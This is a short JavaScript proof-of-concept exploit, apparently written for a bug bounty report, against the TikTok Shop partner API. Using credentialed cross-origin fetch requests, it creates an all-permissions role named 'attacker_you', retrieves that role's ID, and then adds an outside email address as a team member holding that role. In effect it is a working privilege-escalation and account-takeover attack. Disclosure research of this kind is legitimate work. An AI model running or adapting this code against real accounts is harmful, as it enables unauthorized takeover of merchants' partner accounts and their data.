(async () => {
await fetch("https://api-partner-sg.tiktokshop.com/api/v1/partner/team_member/role_create_or_edit?aid=359713&locale=zh-CN", {
  "headers": {
    "content-type": "application/json",
    "Origin": "https://partner.tiktokshop.com"
  },
  "body": '{"action_type":1,"role_name":"attacker_you","permission_key_list":["home","tools_for_tts_sellers","shop_management","service","developer_tool","isv_dashboard","sandbox","api_sdk","api_logs","webhook_log","api_doc","solution_guidance","api_testing_tool","incident_management","openlearn_widgets","my_account","profile","my_authorizations"]}',
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
}); //add a new role for all privls

// step 2:
const response = await fetch("https://api-partner-sg.tiktokshop.com/api/v1/partner/team_member/role_list?aid=359713&locale=zh-CN", {
  "headers": {
    "Origin": "https://partner.tiktokshop.com"
  },
  "method": "GET",
  "mode": "cors",
  "credentials": "include"
});
const result = await response.json();
const roleId = result?.data?.permission_roles?.find?.(role => role?.role_name === 'attacker_you')?.role_id ?? null;
if (roleId) {
// Step 3:
  console.log('成功提取role_id:', roleId);
  fetch("https://api-partner-sg.tiktokshop.com/api/v1/partner/team_member/team_account_operate?aid=359713&locale=zh-CN", {
  "headers": {
    "content-type": "application/json",
    "Origin": "https://partner.tiktokshop.com"
  },
  "body": JSON.stringify({action:1,team_email:"johnstone+attackerme@wearehackerone.com",role_id_list:[roleId]}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
} else {
  console.log('未找到role_name为attacker_you的角色');
}
})();
